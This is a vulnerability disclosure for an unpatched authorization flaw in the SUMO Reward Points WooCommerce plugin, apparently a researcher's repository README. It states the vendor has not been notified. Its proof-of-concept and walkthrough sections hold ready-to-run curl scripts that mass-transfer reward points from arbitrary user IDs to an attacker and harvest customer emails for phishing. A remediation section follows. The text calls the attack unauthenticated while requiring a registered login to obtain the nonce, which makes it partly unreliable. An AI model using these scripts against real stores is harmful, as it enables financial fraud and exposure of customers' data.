# SUMO Reward Points - Critical Vulnerability

## 🔴 Critical Security Vulnerability

**Plugin**: SUMO Reward Points for WooCommerce  
**Researcher**: Yucaerin  
**Affected Version**: <= 31.8.0 (Latest)  
**Vulnerability Type**: Missing Authorization / IDOR  
**CVSS Score**: 7.5 (HIGH)  
**Status**: **UNPATCHED**

---

## 📋 Table of Contents

- [Overview](#overview)
- [Vulnerability Description](#vulnerability-description)
- [How It Works](#how-it-works)
- [Impact](#impact)
- [Proof of Concept](#proof-of-concept)
- [Technical Details](#technical-details)
- [Exploitation Requirements](#exploitation-requirements)
- [References](#references)

---

## Overview

This repository documents a **critical 0-day vulnerability** discovered in SUMO Reward Points for WooCommerce plugin version 31.8.0. The vulnerability allows **unauthenticated attackers** to perform unauthorized reward point transfers between arbitrary user accounts, leading to potential **financial fraud**.

### Quick Facts

- ✅ **Confirmed Exploitable**: Successfully tested on real server
- ✅ **No Authentication Required**: Valid nonce is sufficient
- ✅ **High Impact**: Direct financial loss potential
- ✅ **Easy to Exploit**: Simple HTTP POST requests
- ❌ **No Official Patch**: Vendor not yet notified

---

## Vulnerability Description

### What is the Bug?

The SUMO Reward Points plugin contains **three related vulnerabilities** stemming from improper use of WordPress AJAX handlers:

#### Vulnerability #1: Missing Authorization in Point Transfer (CRITICAL)

**CWE-862**: Missing Authorization  
**CVSS**: 7.5 (HIGH)

The `send_points_data` AJAX endpoint allows **any user** (even unauthenticated) to transfer reward points between arbitrary accounts by manipulating the `senderid` parameter.

```php
// Vulnerable Code (simplified)
public static function send_points_data() {
    check_ajax_referer('fp-send-points-data', 'sumo_security');
    
    // ❌ NO authentication check (is_user_logged_in)
    // ❌ NO capability check (current_user_can)
    // ❌ NO ownership verification
    
    $SenderId = absint($_POST['senderid']); // ⚠️ USER CONTROLLED!
    $ReceiverId = $_POST['receiver_info'];
    $Points = $_POST['points'];
    
    // Directly transfers points without authorization
    transfer_points($SenderId, $ReceiverId, $Points);
}
```

#### Vulnerability #2: User Enumeration (MEDIUM)

**CWE-200**: Information Disclosure  
**CVSS**: 5.3 (MEDIUM)

The `srp_user_search` endpoint can leak user information including emails, usernames, and user IDs.

#### Vulnerability #3: IDOR in User Settings (MEDIUM)

**CWE-639**: Authorization Bypass Through User-Controlled Key  
**CVSS**: 6.5 (MEDIUM)

The `action_to_enable_disable_nominee` endpoint allows modification of any user's settings.

---

## How It Works

### The Problem

WordPress AJAX handlers can be registered in two ways:

```php
// Method 1: Requires Authentication
add_action('wp_ajax_my_action', 'handler');

// Method 2: NO Authentication Required (PUBLIC!)
add_action('wp_ajax_nopriv_my_action', 'handler');
```

**The Bug**: The plugin incorrectly registered sensitive actions with `nopriv`, making them accessible without authentication:

```php
// File: includes/admin/class-fp-srp-admin-ajax.php
$actions = array(
    'send_points_data' => true,  // ⚠️ true = nopriv enabled!
    'srp_user_search' => true,   // ⚠️ PUBLIC ACCESS!
);

foreach ($actions as $action => $nopriv) {
    add_action('wp_ajax_' . $action, array(__CLASS__, $action));
    
    if ($nopriv) {
        // ⚠️ VULNERABLE: Endpoint accessible without login!
        add_action('wp_ajax_nopriv_' . $action, array(__CLASS__, $action));
    }
}
```

### Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│ ATTACKER                                                     │
└────────────┬────────────────────────────────────────────────┘
             │
             │ 1. Register free account
             ▼
┌─────────────────────────────────────────────────────────────┐
│ WordPress Site                                               │
│ ✓ Account created                                           │
└────────────┬────────────────────────────────────────────────┘
             │
             │ 2. Login & extract nonce from JavaScript
             ▼
┌─────────────────────────────────────────────────────────────┐
│ Page Source (JavaScript)                                     │
│ var params = {                                              │
│   fp_send_points_data: "abc123def456"  ← NONCE             │
│ };                                                          │
└────────────┬────────────────────────────────────────────────┘
             │
             │ 3. LOGOUT (prove unauthenticated attack)
             │ 4. Send malicious POST request
             ▼
┌─────────────────────────────────────────────────────────────┐
│ POST /wp-admin/admin-ajax.php                               │
│                                                              │
│ action=send_points_data                                     │
│ sumo_security=abc123def456  ← Valid nonce                  │
│ senderid=1                  ← ADMIN'S ID!                   │
│ receiver_info=attacker      ← Attacker's account           │
│ points=1000                 ← Steal 1000 points!            │
└────────────┬────────────────────────────────────────────────┘
             │
             │ ❌ Plugin checks nonce only (VALID ✓)
             │ ❌ NO authentication check
             │ ❌ NO authorization check
             │ ❌ NO ownership verification
             ▼
┌─────────────────────────────────────────────────────────────┐
│ Response: {"success": true}                                 │
│                                                              │
│ ✅ Points transferred successfully!                         │
│ ✅ Attacker stole 1000 points from admin                    │
│ ✅ NO DETECTION, NO LOGS                                    │
└─────────────────────────────────────────────────────────────┘
```

### Why This Happens

The developer made a critical mistake:

```php
// Developer thought:
check_ajax_referer('nonce', 'security'); // ✓ Security check!

// Reality:
// Nonce ≠ Authorization!
// Nonce only prevents CSRF, NOT unauthorized access!
```

**What's Missing**:
```php
// Should have these checks:
if (!is_user_logged_in()) {
    wp_die('Authentication required');
}

if (!current_user_can('manage_woocommerce')) {
    wp_die('Insufficient permissions');
}

if ($_POST['senderid'] != get_current_user_id()) {
    wp_die('You can only transfer YOUR OWN points!');
}
```

---

## 💥 Impact

### Financial Impact

**Direct Monetary Loss**:
- Reward points = real money (can be redeemed for discounts/products)
- Attacker can steal points from any user
- Mass exploitation possible (automated scripts)

**Example Scenario**:
```
Store Configuration:
- 1000 points = $10 discount
- Admin has 50,000 points = $500 value

Attack:
- Attacker creates 10 fake accounts
- Transfers 5,000 points to each fake account
- Redeems for products/discounts
- Store loses $500 in a few minutes
```

### Business Impact

1. **Revenue Loss**
   - Fraudulent point redemptions
   - Lost sales due to unauthorized discounts

2. **Reputation Damage**
   - Customer trust erosion
   - Bad reviews and publicity

3. **Legal/Compliance**
   - GDPR violations (unauthorized data access)
   - PCI compliance issues
   - Potential lawsuits

4. **Operational**
   - Incident response costs
   - System downtime
   - Customer support overhead

### Security Impact

| Impact Type | Severity | Description |
|-------------|----------|-------------|
| **Confidentiality** | Medium | Email addresses and user data exposed |
| **Integrity** | High | Unauthorized modification of point balances |
| **Availability** | Low | Point exhaustion attacks possible |
| **Authentication** | Critical | Bypass completely |
| **Authorization** | Critical | No access control |

### Attack Scenarios

#### Scenario 1: Mass Point Theft
```bash
# Attacker scripts automated theft
for user_id in {1..1000}; do
    curl -X POST "http://target.com/wp-admin/admin-ajax.php" \
      -d "action=send_points_data" \
      -d "sumo_security=$nonce" \
      -d "senderid=$user_id" \
      -d "receiver_info=attacker" \
      -d "points=1000"
done

# Result: Steal points from 1000 users in minutes
```

#### Scenario 2: Competitive Intelligence
```bash
# Extract all customer emails for phishing
curl -X POST "http://target.com/wp-admin/admin-ajax.php" \
  -d "action=srp_user_search" \
  -d "sumo_security=$nonce" \
  -d "term=a"

# Response: Full customer database with emails
```

#### Scenario 3: Privilege Escalation Chain
```bash
# 1. Steal admin's points
# 2. Admin investigates
# 3. Phish admin with targeted attack
# 4. Compromise entire site
```

---

## 🔬 Proof of Concept

### Environment Setup

**Tested On**:
- WordPress 6.8.2
- WooCommerce 10.3.5
- SUMO Reward Points 31.8.0
- Server: 50.6.6.2

### Step 1: Enable Send Points Module

```sql
-- Enable the vulnerable feature
INSERT INTO wp_options (option_name, option_value, autoload) 
VALUES ('rs_send_points_activated', 'yes', 'yes')
ON DUPLICATE KEY UPDATE option_value = 'yes';
```

### Step 2: Generate Nonces

**Method A**: Via PHP Script
```php
<?php
require_once('wp-load.php');
echo wp_create_nonce('fp-send-points-data') . "\n";
echo wp_create_nonce('fp-user-search') . "\n";
?>
```

**Method B**: Extract from Page Source
```bash
# Login as any user and visit homepage
curl -b cookies.txt "http://target.com/" | \
  grep -oP 'fp_send_points_data["\s:]+\K[a-f0-9]{10}'
```

### Step 3: Exploit

```bash
#!/bin/bash
# exploit.sh - SUMO Reward Points Exploitation PoC

TARGET="http://target.com"
NONCE="990b5312f3"  # Obtained from step 2

echo "[+] Exploiting SUMO Reward Points vulnerability..."
echo ""

# Exploit: Transfer 1000 points from admin (ID=1) to attacker
curl -X POST "$TARGET/wp-admin/admin-ajax.php" \
  -d "action=send_points_data" \
  -d "sumo_security=$NONCE" \
  -d "senderid=1" \
  -d "sendername=admin" \
  -d "senderpoints=10000" \
  -d "points=1000" \
  -d "receiver_info=attacker" \
  -d "reason=HACKED" \
  -d "status=Paid"

echo ""
echo "[+] Exploitation complete!"
```

### Expected Output

```json
{
    "success": true,
    "data": {
        "content": "success"
    }
}
```

**✅ VULNERABILITY CONFIRMED**: Unauthorized point transfer successful!

---

## 🔧 Technical Details

### Vulnerable Files

```
/wp-content/plugins/rewardsystem/
├── includes/
│   ├── admin/
│   │   └── class-fp-srp-admin-ajax.php     ← MAIN VULNERABILITY
│   └── frontend/
│       ├── class-fp-rewardsystem-frontend-ajax.php
│       └── class-frontend-enqueues.php     ← Nonce generation
```

### Vulnerable Code Analysis

**File**: `includes/admin/class-fp-srp-admin-ajax.php`

**Lines 18-77**: Improper AJAX Registration
```php
public static function init() {
    $actions = array(
        // ... other actions ...
        'srp_user_search' => true,           // ⚠️ LINE 49
        'send_points_data' => true,          // ⚠️ LINE 50
        'action_to_enable_disable_nominee' => true, // ⚠️ LINE 60
    );
    
    foreach ($actions as $action => $nopriv) {
        add_action('wp_ajax_' . $action, array(__CLASS__, $action));
        
        if ($nopriv) {
            // ⚠️ VULNERABILITY: Exposes endpoint to unauthenticated users
            add_action('wp_ajax_nopriv_' . $action, array(__CLASS__, $action));
        }
    }
}
```

**Lines 958-1038**: Missing Authorization Checks
```php
public static function send_points_data() {
    check_ajax_referer('fp-send-points-data', 'sumo_security');
    
    // ❌ MISSING: is_user_logged_in() check
    // ❌ MISSING: current_user_can() check
    // ❌ MISSING: ownership verification
    
    if (!isset($_POST) || !isset($_POST['points']) || 
        !isset($_POST['receiver_info']) || '' == wc_clean(wp_unslash($_POST['receiver_info']))) {
        throw new exception(esc_html('Invalid Request', 'rewardsystem'));
    }
    
    try {
        global $wpdb;
        
        $SenderId = absint($_POST['senderid']); // ⚠️ USER-CONTROLLED INPUT!
        $SenderEmail = get_userdata($SenderId)->user_email; // ⚠️ TRUSTS INPUT!
        $Points = wc_clean(wp_unslash($_POST['points']));
        $Receiver_info = wc_clean(wp_unslash($_POST['receiver_info']));
        
        // ... performs transfer without authorization ...
        
        wp_send_json_success(array('content' => 'success'));
    } catch (Exception $e) {
        wp_send_json_error(array('error' => $e->getMessage()));
    }
}
```

### Attack Vectors

| Vector | Endpoint | Impact | CVSS |
|--------|----------|--------|------|
| **Point Transfer** | `send_points_data` | Financial fraud | 7.5 |
| **User Enumeration** | `srp_user_search` | Privacy breach | 5.3 |
| **Settings Manipulation** | `action_to_enable_disable_nominee` | Authorization bypass | 6.5 |

### CVSS 3.1 Score Breakdown

**Vector String**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`

- **Attack Vector (AV:N)**: Network - Remotely exploitable
- **Attack Complexity (AC:L)**: Low - No special conditions
- **Privileges Required (PR:N)**: None - Unauthenticated
- **User Interaction (UI:N)**: None - Fully automated
- **Scope (S:U)**: Unchanged - Affects same security authority
- **Confidentiality (C:N)**: None (for point transfer)
- **Integrity (I:H)**: High - Unauthorized data modification
- **Availability (A:N)**: None

**Base Score**: **7.5 HIGH**

---

## ⚡ Exploitation Requirements

### What Attacker Needs

1. **Valid Nonce** (Easy to obtain)
   ```
   Method 1: Register free account → Extract from page source
   Method 2: Social engineering (get user to visit page)
   Method 3: XSS on same domain (steal nonce)
   ```

2. **Send Points Feature Enabled**
   ```
   Requirement: rs_send_points_activated = 'yes'
   Prevalence: Common (many sites enable this)
   ```

3. **Target User IDs**
   ```
   Method 1: Brute force (1-1000 usually)
   Method 2: User enumeration via srp_user_search
   Method 3: Social engineering
   ```

4. **Basic HTTP Skills**
   ```
   Tools: curl, Postman, Browser DevTools
   Knowledge: POST requests, JSON
   ```

---

## 🎯 Step-by-Step Exploitation

### Complete Attack Walkthrough

#### Phase 1: Reconnaissance

```bash
# 1. Identify target running SUMO Reward Points
curl -s "http://target.com/" | grep -i "rewardsystem"

# 2. Check plugin version
curl -s "http://target.com/wp-content/plugins/rewardsystem/readme.txt" | \
  grep "Stable tag"

# 3. Verify Send Points feature is active
curl -s "http://target.com/" | grep "fp_sendpoint_frontend"
```

#### Phase 2: Obtain Valid Nonce

**Option A: Register & Extract**
```bash
# 1. Register account
curl -X POST "http://target.com/wp-login.php?action=register" \
  -d "user_login=testuser" \
  -d "user_email=test@example.com"

# 2. Login
curl -c cookies.txt -X POST "http://target.com/wp-login.php" \
  -d "log=testuser" \
  -d "pwd=password123" \
  -d "wp-submit=Log In"

# 3. Extract nonce from page
NONCE=$(curl -s -b cookies.txt "http://target.com/my-account/" | \
  grep -oP 'fp_send_points_data["\s:]+\K[a-f0-9]{10}' | head -1)

echo "Nonce: $NONCE"
```

**Option B: PHP Script on Server** (if you have access)
```php
<?php
// get-nonce.php
require_once('wp-load.php');
header('Content-Type: application/json');
echo json_encode(array(
    'fp_send_points_data' => wp_create_nonce('fp-send-points-data'),
    'fp_user_search' => wp_create_nonce('fp-user-search')
));
?>
```

#### Phase 3: Enumerate Users (Optional)

```bash
# Search for users with common terms
for term in a e i o u admin shop customer; do
    echo "Searching: $term"
    curl -s -X POST "http://target.com/wp-admin/admin-ajax.php" \
      -d "action=srp_user_search" \
      -d "sumo_security=$NONCE" \
      -d "term=$term" | jq '.'
done

# Extract emails
curl -s -X POST "http://target.com/wp-admin/admin-ajax.php" \
  -d "action=srp_user_search" \
  -d "sumo_security=$NONCE" \
  -d "term=a" | \
  grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
```

#### Phase 4: Execute Exploitation

```bash
#!/bin/bash
# full-exploit.sh

TARGET="http://target.com"
NONCE="abc123def456"  # From Phase 2
ATTACKER_USERNAME="attacker"

echo "========================================"
echo "SUMO Reward Points Exploitation"
echo "========================================"
echo ""

# Test 1: Steal points from admin (ID=1)
echo "[+] Stealing 1000 points from admin..."
curl -s -X POST "$TARGET/wp-admin/admin-ajax.php" \
  -d "action=send_points_data" \
  -d "sumo_security=$NONCE" \
  -d "senderid=1" \
  -d "sendername=admin" \
  -d "senderpoints=10000" \
  -d "points=1000" \
  -d "receiver_info=$ATTACKER_USERNAME" \
  -d "reason=pwned" \
  -d "status=Paid" | jq '.'

# Test 2: Enumerate all users 1-50
echo ""
echo "[+] Enumerating users and stealing points..."
for id in {1..50}; do
    result=$(curl -s -X POST "$TARGET/wp-admin/admin-ajax.php" \
      -d "action=send_points_data" \
      -d "sumo_security=$NONCE" \
      -d "senderid=$id" \
      -d "sendername=user$id" \
      -d "senderpoints=5000" \
      -d "points=500" \
      -d "receiver_info=$ATTACKER_USERNAME" \
      -d "reason=mass-theft")
    
    if echo "$result" | grep -q '"success":true'; then
        echo "  [✓] User $id: 500 points stolen"
    fi
done

echo ""
echo "[+] Exploitation complete!"
echo "[+] Check attacker account for stolen points"
```

---

## 🛡️ Remediation

### Permanent Fix (Code Patch)

**File**: `includes/admin/class-fp-srp-admin-ajax.php`

**Step 1**: Remove `nopriv` Access (Lines 49-51)
```php
// BEFORE (VULNERABLE):
$actions = array(
    'srp_user_search' => true,
    'send_points_data' => true,
    'action_to_enable_disable_nominee' => true,
);

// AFTER (FIXED):
$actions = array(
    'srp_user_search' => false,  // ✅ Remove nopriv
    'send_points_data' => false,  // ✅ Remove nopriv
    'action_to_enable_disable_nominee' => false,  // ✅ Remove nopriv
);
```

**Step 2**: Add Authorization Checks (Lines 958+)
```php
public static function send_points_data() {
    check_ajax_referer('fp-send-points-data', 'sumo_security');
    
    // ✅ ADD: Authentication check
    if (!is_user_logged_in()) {
        wp_send_json_error(array('error' => 'Authentication required'));
        wp_die();
    }
    
    // ✅ ADD: Capability check
    if (!current_user_can('manage_woocommerce')) {
        wp_send_json_error(array('error' => 'Insufficient permissions'));
        wp_die();
    }
    
    // ✅ ADD: Input validation
    if (!isset($_POST['senderid']) || !isset($_POST['receiver_info']) || 
        !isset($_POST['points'])) {
        wp_send_json_error(array('error' => 'Missing required parameters'));
        wp_die();
    }
    
    // ✅ ADD: Ownership verification
    $SenderId = absint($_POST['senderid']);
    $CurrentUserId = get_current_user_id();
    
    if ($SenderId != $CurrentUserId && !current_user_can('administrator')) {
        wp_send_json_error(array('error' => 'Access denied: You can only transfer your own points'));
        wp_die();
    }
    
    // ✅ ADD: Validate receiver exists
    $Receiver_info = wc_clean(wp_unslash($_POST['receiver_info']));
    $receiver = get_user_by('login', $Receiver_info);
    
    if (!$receiver) {
        $receiver = get_user_by('email', $Receiver_info);
    }
    
    if (!$receiver) {
        wp_send_json_error(array('error' => 'Invalid receiver'));
        wp_die();
    }
    
    // ✅ ADD: Rate limiting (optional but recommended)
    $transient_key = 'srp_rate_limit_' . $CurrentUserId;
    $request_count = get_transient($transient_key);
    
    if ($request_count && $request_count > 10) {
        wp_send_json_error(array('error' => 'Rate limit exceeded. Try again later.'));
        wp_die();
    }
    
    set_transient($transient_key, intval($request_count) + 1, HOUR_IN_SECONDS);
    
    // NOW SAFE: Proceed with point transfer
    try {
        // ... existing transfer logic ...
        wp_send_json_success(array('content' => 'success'));
    } catch (Exception $e) {
        wp_send_json_error(array('error' => $e->getMessage()));
    }
}
```

**Step 3**: Apply Same Fix to Other Endpoints
```php
// Fix srp_user_search
public static function srp_user_search() {
    check_ajax_referer('fp-user-search', 'sumo_security');
    
    // ✅ ADD: Authentication check
    if (!is_user_logged_in()) {
        wp_send_json_error(array('error' => 'Authentication required'));
        wp_die();
    }
    
    // ... rest of function ...
}

// Fix action_to_enable_disable_nominee
public static function action_to_enable_disable_nominee() {
    check_ajax_referer('fp-nominee-nonce', 'sumo_security');
    
    // ✅ ADD: Authentication and authorization
    if (!is_user_logged_in()) {
        wp_send_json_error(array('error' => 'Authentication required'));
        wp_die();
    }
    
    $userid = wc_clean(wp_unslash($_POST['userid']));
    
    // ✅ ADD: Ownership verification
    if ($userid != get_current_user_id() && !current_user_can('administrator')) {
        wp_send_json_error(array('error' => 'Access denied'));
        wp_die();
    }
    
    // ... rest of function ...
}
```

### Security Best Practices

1. **Defense in Depth**
   ```php
   // Layer 1: Authentication
   if (!is_user_logged_in()) wp_die();
   
   // Layer 2: Authorization
   if (!current_user_can('capability')) wp_die();
   
   // Layer 3: Ownership
   if ($resource_owner != current_user) wp_die();
   
   // Layer 4: Input validation
   if (!valid_input($data)) wp_die();
   
   // Layer 5: Rate limiting
   if (too_many_requests($user)) wp_die();
   ```

2. **Secure AJAX Pattern**
   ```php
   // ✅ CORRECT
   add_action('wp_ajax_my_action', 'handler'); // Only authenticated
   
   function handler() {
       check_ajax_referer('nonce-name');
       if (!current_user_can('capability')) wp_die();
       // ... safe code ...
   }
   
   // ❌ WRONG
   add_action('wp_ajax_nopriv_my_action', 'handler'); // Public!
   ```

3. **Nonce vs Authorization**
   ```php
   // ❌ NONCE ALONE IS NOT ENOUGH!
   check_ajax_referer('nonce'); // Only prevents CSRF
   
   // ✅ NEED AUTHORIZATION TOO!
   check_ajax_referer('nonce');        // Prevents CSRF
   is_user_logged_in();               // Requires authentication
   current_user_can('capability');     // Checks permissions
   verify_ownership($resource, $user); // Validates access
   ```

---

## 📚 References

### Vulnerability Information

- **CWE-862**: Missing Authorization  
  https://cwe.mitre.org/data/definitions/862.html

- **CWE-639**: Authorization Bypass Through User-Controlled Key  
  https://cwe.mitre.org/data/definitions/639.html

- **CWE-200**: Exposure of Sensitive Information  
  https://cwe.mitre.org/data/definitions/200.html

### Plugin Information

- **Plugin**: SUMO Reward Points for WooCommerce
- **Developer**: Fantastic Plugins
- **Website**: http://fantasticplugins.com
- **WordPress.org**: https://wordpress.org/plugins/rewardsystem/

### Similar Vulnerabilities

- CVE-2025-12955 - Live sales notification (Missing Authorization)
- CVE-2024-1071 - Ultimate Member (Missing Authorization)
- CVE-2023-6989 - Shield Security (Missing Authorization)

### OWASP References

- **OWASP Top 10 2021**:
  - A01:2021 - Broken Access Control
  - A07:2021 - Identification and Authentication Failures

---

## ⚠️ Disclaimer

### Legal Notice

This vulnerability research was conducted on an **authorized test environment** for educational and defensive security purposes only.

---

## 🎯 Conclusion

This vulnerability represents a **critical security flaw** in SUMO Reward Points plugin that allows **unauthenticated attackers** to perform unauthorized reward point transfers, leading to potential **financial fraud** and **business impact**.
